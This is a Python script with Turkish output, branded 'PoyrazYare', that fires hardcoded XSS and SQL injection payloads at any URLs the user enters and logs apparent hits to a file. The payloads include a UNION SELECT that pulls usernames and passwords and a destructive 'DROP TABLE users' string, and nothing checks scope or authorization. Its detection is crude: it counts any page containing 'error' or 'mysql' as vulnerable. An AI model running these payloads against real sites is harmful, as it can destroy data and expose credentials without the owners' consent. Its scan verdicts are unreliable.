import requests
import time
import threading
import re

def validate_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}|[A-Z0-9-]{2,})|'
        r'localhost|'
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'
        r'?[A-F0-9]*:[A-F0-9:]+?)'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

def scan_for_xss(url, payloads, found_xss):
    print(f"\n{url} için PoyrazYare XSS Açıkları taranıyor...")
    for payload in payloads:
        try:
            response = requests.get(url + payload, timeout=5)
            response.raise_for_status()
            if payload in response.text:
                print(f"PoyrazYare XSS Açığı Bulundu! Payload: {payload}")
                found_xss.append(payload)
            else:
                print(f"Payload {payload} ile açık bulunamadı.")
        except requests.exceptions.HTTPError as http_err:
            print(f"HTTP Hatası: {http_err}")
        except requests.exceptions.RequestException as req_err:
            print(f"İstek Hatası: {req_err}")

def scan_for_sql_injection(url, payloads, found_sql_injection):
    print(f"\n{url} için PoyrazYare SQL Enjeksiyon Açıkları taranıyor...")
    for payload in payloads:
        try:
            response = requests.get(url + payload, timeout=5)
            response.raise_for_status()
            if "error" in response.text.lower() or "mysql" in response.text.lower():
                print(f"PoyrazYare SQL Enjeksiyon Açığı Bulundu! Payload: {payload}")
                found_sql_injection.append(payload)
            else:
                print(f"Payload {payload} ile açık bulunamadı.")
        except requests.exceptions.HTTPError as http_err:
            print(f"HTTP Hatası: {http_err}")
        except requests.exceptions.RequestException as req_err:
            print(f"İstek Hatası: {req_err}")

def save_results(results, url):
    with open("vulnerability_results.txt", "a") as f:
        f.write(f"PoyrazYare Taramanın yapıldığı URL: {url}\n")
        f.write("PoyrazYare XSS Açıkları:\n")
        if results['xss']:
            for payload in results['xss']:
                f.write(f"- {payload}\n")
        else:
            f.write("Hiçbir PoyrazYare XSS açığı bulunamadı.\n")
        
        f.write("PoyrazYare SQL Enjeksiyon Açıkları:\n")
        if results['sql']:
            for payload in results['sql']:
                f.write(f"- {payload}\n")
        else:
            f.write("Hiçbir PoyrazYare SQL enjeksiyon açığı bulunamadı.\n")
        
        f.write("\n" + "="*50 + "\n")

def scan_url(url, xss_payloads, sql_payloads):
    found_xss = []
    found_sql_injection = []
    start_time = time.time()
    
    scan_for_xss(url, xss_payloads, found_xss)
    scan_for_sql_injection(url, sql_payloads, found_sql_injection)
    
    save_results({'xss': found_xss, 'sql': found_sql_injection}, url)
    
    elapsed_time = time.time() - start_time
    print(f"\n{url} için PoyrazYare tarama süresi: {elapsed_time:.2f} saniye")

def main():
    urls = input("PoyrazYare ile taramak istediğiniz URL'leri girin (virgülle ayırarak): ").split(',')
    urls = [url.strip() for url in urls]
    
    valid_urls = [url for url in urls if validate_url(url)]
    if not valid_urls:
        print("Geçerli bir URL girin.")
        return
    
    default_xss_payloads = [
        "<script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>"
    ]

    default_sql_payloads = [
        "' OR '1'='1' --",
        "' OR '1'='2' --",
        "admin' --",
        "' UNION SELECT NULL, username, password FROM users --",
        "'; DROP TABLE users; --"
    ]
    
    threads = []
    for url in valid_urls:
        thread = threading.Thread(target=scan_url, args=(url, default_xss_payloads, default_sql_payloads))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()